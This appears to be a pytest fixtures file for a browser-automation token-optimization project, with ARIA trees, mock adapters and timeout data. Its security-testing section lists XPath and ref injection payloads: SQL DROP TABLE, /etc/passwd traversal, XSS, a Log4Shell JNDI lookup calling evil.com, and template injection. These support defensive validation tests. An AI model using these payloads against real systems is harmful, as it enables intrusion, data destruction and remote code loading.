"""Pytest fixtures for domain tests.

These fixtures support testing the token optimization bounded contexts:
- Snapshot Context
- Element Registry Context
- Timeout Context
- Action Context
- Optimization/Self-Learning System
"""

from __future__ import annotations

import json
import tempfile
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional
from unittest.mock import MagicMock, Mock

import pytest


# =============================================================================
# Snapshot Domain Fixtures
# =============================================================================


@pytest.fixture
def sample_aria_tree_yaml() -> str:
    """Sample ARIA tree in YAML format as returned by Browser Library."""
    return """- document [ref=e1]
  - heading "Example Domain" [level=1] [ref=e2]
  - paragraph [ref=e3]: This domain is for illustrative examples...
  - link "More information..." [ref=e4]
  - button "Submit" [ref=e5]
  - textbox "Email" [ref=e6]
  - list [ref=e7]
    - listitem "Item 1" [ref=e8]
    - listitem "Item 2" [ref=e9]
    - listitem "Item 3" [ref=e10]"""


@pytest.fixture
def sample_aria_nodes() -> List[Dict[str, Any]]:
    """Sample ARIA tree as structured node data."""
    return [
        {
            "role": "document",
            "ref": "e1",
            "name": "",
            "children": [
                {"role": "heading", "ref": "e2", "name": "Example Domain", "level": 1},
                {
                    "role": "paragraph",
                    "ref": "e3",
                    "name": "This domain is for illustrative examples...",
                },
                {"role": "link", "ref": "e4", "name": "More information..."},
                {"role": "button", "ref": "e5", "name": "Submit"},
                {"role": "textbox", "ref": "e6", "name": "Email"},
                {
                    "role": "list",
                    "ref": "e7",
                    "children": [
                        {"role": "listitem", "ref": "e8", "name": "Item 1"},
                        {"role": "listitem", "ref": "e9", "name": "Item 2"},
                        {"role": "listitem", "ref": "e10", "name": "Item 3"},
                    ],
                },
            ],
        }
    ]


@pytest.fixture
def complex_aria_tree_yaml() -> str:
    """Complex ARIA tree for testing folding and compression."""
    items = "\n".join(
        [f'    - listitem "Product {i}" [ref=e{100+i}]' for i in range(1, 51)]
    )
    return f"""- document [ref=e1]
  - heading "Product Catalog" [level=1] [ref=e2]
  - list [ref=e3]
{items}"""


@pytest.fixture
def changed_aria_tree_yaml() -> str:
    """Modified ARIA tree for testing incremental diffs."""
    return """- document [ref=e1]
  - heading "Example Domain" [level=1] [ref=e2]
  - paragraph [ref=e3]: This domain is for illustrative examples...
  - link "More information..." [ref=e4]
  - button "Submit" [ref=e5]
  - textbox "Email" [ref=e6]
  - paragraph [ref=e11]: New paragraph added
  - list [ref=e7]
    - listitem "Item 1" [ref=e8]
    - listitem "Item 2 Modified" [ref=e9]
    - listitem "Item 3" [ref=e10]"""


# =============================================================================
# Element Registry Domain Fixtures
# =============================================================================


@pytest.fixture
def mock_browser_adapter():
    """Mock browser adapter for element operations."""
    adapter = MagicMock()
    adapter.get_locator_for_ref = Mock(
        side_effect=lambda ref: f"css=[data-ref='{ref}']"
    )
    adapter.is_element_attached = Mock(return_value=True)
    adapter.get_element_states = Mock(return_value=["visible", "enabled", "attached"])
    return adapter


@pytest.fixture
def element_registry_data() -> Dict[str, Dict[str, Any]]:
    """Sample element registry data."""
    return {
        "e1": {
            "locator": "css=html",
            "role": "document",
            "name": "",
            "stale": False,
        },
        "e2": {
            "locator": "css=h1",
            "role": "heading",
            "name": "Example Domain",
            "stale": False,
        },
        "e4": {
            "locator": "css=a",
            "role": "link",
            "name": "More information...",
            "stale": False,
        },
        "e5": {
            "locator": "css=button",
            "role": "button",
            "name": "Submit",
            "stale": False,
        },
    }


# =============================================================================
# Timeout Domain Fixtures
# =============================================================================


@pytest.fixture
def default_timeout_config() -> Dict[str, int]:
    """Default timeout configuration in milliseconds."""
    return {
        "action_timeout": 5000,
        "navigation_timeout": 60000,
        "assertion_retry": 10000,
        "min_timeout": 100,
        "max_timeout": 300000,
    }


@pytest.fixture
def custom_timeout_config() -> Dict[str, int]:
    """Custom timeout configuration for testing overrides."""
    return {
        "action_timeout": 3000,
        "navigation_timeout": 30000,
        "assertion_retry": 5000,
        "min_timeout": 50,
        "max_timeout": 120000,
    }


# =============================================================================
# Action Domain Fixtures
# =============================================================================


@pytest.fixture
def mock_action_executor():
    """Mock action executor for testing action domain."""
    executor = MagicMock()
    executor.click = Mock(return_value={"success": True, "action": "click"})
    executor.fill = Mock(return_value={"success": True, "action": "fill"})
    executor.select = Mock(return_value={"success": True, "action": "select"})
    executor.get_states = Mock(return_value=["visible", "enabled", "attached"])
    return executor


@pytest.fixture
def sample_action_responses() -> Dict[str, Dict[str, Any]]:
    """Sample action responses for different verbosity levels."""
    return {
        "click_success": {
            "success": True,
            "action": "click",
            "element": "Submit button",
            "ref": "e5",
            "snapshot_mode": "incremental",
        },
        "click_failure": {
            "success": False,
            "action": "click",
            "error": "Element not visible",
            "ref": "e5",
        },
        "fill_success": {
            "success": True,
            "action": "fill",
            "element": "Email textbox",
            "ref": "e6",
            "value": "test@example.com",
        },
    }


# =============================================================================
# Pattern Store / Optimization Fixtures
# =============================================================================


@pytest.fixture
def pattern_store(tmp_path: Path):
    """Create a PatternStore instance with temporary storage."""
    # Import here to avoid import errors if module doesn't exist yet
    from tests.unit.domains.test_optimization import MockPatternStore

    return MockPatternStore(storage_dir=tmp_path / "patterns")


@pytest.fixture
def sample_compression_patterns() -> List[Dict[str, Any]]:
    """Sample compression pattern data for learning tests."""
    return [
        {
            "page_type": "product_list",
            "original_tokens": 5000,
            "compressed_tokens": 500,
            "compression_ratio": 0.9,
            "settings": {"fold_lists": True, "similarity_threshold": 0.85},
        },
        {
            "page_type": "product_list",
            "original_tokens": 4800,
            "compressed_tokens": 480,
            "compression_ratio": 0.9,
            "settings": {"fold_lists": True, "similarity_threshold": 0.85},
        },
        {
            "page_type": "form",
            "original_tokens": 1000,
            "compressed_tokens": 800,
            "compression_ratio": 0.2,
            "settings": {"fold_lists": False, "similarity_threshold": 0.9},
        },
    ]


@pytest.fixture
def sample_timeout_patterns() -> List[Dict[str, Any]]:
    """Sample timeout pattern data for learning tests."""
    return [
        {"action": "click", "actual_duration_ms": 120, "success": True},
        {"action": "click", "actual_duration_ms": 150, "success": True},
        {"action": "click", "actual_duration_ms": 200, "success": True},
        {"action": "click", "actual_duration_ms": 5100, "success": False},
        {"action": "navigate", "actual_duration_ms": 2500, "success": True},
        {"action": "navigate", "actual_duration_ms": 3000, "success": True},
        {"action": "navigate", "actual_duration_ms": 45000, "success": True},
    ]


@pytest.fixture
def sample_performance_metrics() -> List[Dict[str, Any]]:
    """Sample performance metrics for collector tests."""
    return [
        {
            "operation": "snapshot_generation",
            "duration_ms": 150,
            "tokens_before": 5000,
            "tokens_after": 500,
        },
        {
            "operation": "snapshot_generation",
            "duration_ms": 180,
            "tokens_before": 6000,
            "tokens_after": 600,
        },
        {"operation": "element_lookup", "duration_ms": 5},
        {"operation": "element_lookup", "duration_ms": 8},
        {"operation": "action_execution", "duration_ms": 120},
    ]


# =============================================================================
# Security Testing Fixtures
# =============================================================================


@pytest.fixture
def xpath_injection_payloads() -> List[str]:
    """Common XPath injection payloads for security testing."""
    return [
        "' or '1'='1",
        '" or "1"="1',
        "' or ''='",
        "admin'--",
        "' and '1'='1' and ''='",
        "concat('a','b')",
        "x']|//*[contains(.,'",
        "')]/../*[1]",
        "' or count(/*)=1 or '",
        "x') or name()='a' or ('x'='",
    ]


@pytest.fixture
def ref_injection_payloads() -> List[str]:
    """Common ref injection payloads for security testing."""
    return [
        "e1; DROP TABLE elements;",
        "../../../etc/passwd",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{constructor.constructor('return this')()}}",
        "e1\x00malicious",
        "e1\ninjected",
    ]


# =============================================================================
# Helper Classes (for tests that need mock implementations)
# =============================================================================


@dataclass
class MockSnapshotId:
    """Mock SnapshotId value object."""

    value: str = field(default_factory=lambda: str(uuid.uuid4())[:8])

    def __post_init__(self):
        object.__setattr__(self, "_frozen", True)

    def __setattr__(self, name, value):
        if getattr(self, "_frozen", False):
            raise AttributeError("SnapshotId is immutable")
        object.__setattr__(self, name, value)


@dataclass
class MockElementRef:
    """Mock ElementRef value object."""

    index: int

    @classmethod
    def from_index(cls, index: int) -> "MockElementRef":
        return cls(index=index)

    @property
    def ref(self) -> str:
        return f"e{self.index}"


@dataclass
class MockMilliseconds:
    """Mock Milliseconds value object."""

    value: int

    def __post_init__(self):
        if self.value < 0:
            raise ValueError("Milliseconds cannot be negative")

    @classmethod
    def from_seconds(cls, seconds: float) -> "MockMilliseconds":
        return cls(value=int(seconds * 1000))

    def to_seconds(self) -> float:
        return self.value / 1000.0


@pytest.fixture
def mock_snapshot_id():
    """Create a mock SnapshotId."""
    return MockSnapshotId()


@pytest.fixture
def mock_element_ref():
    """Create a mock ElementRef factory."""
    return MockElementRef.from_index


@pytest.fixture
def mock_milliseconds():
    """Create a mock Milliseconds factory."""
    return MockMilliseconds
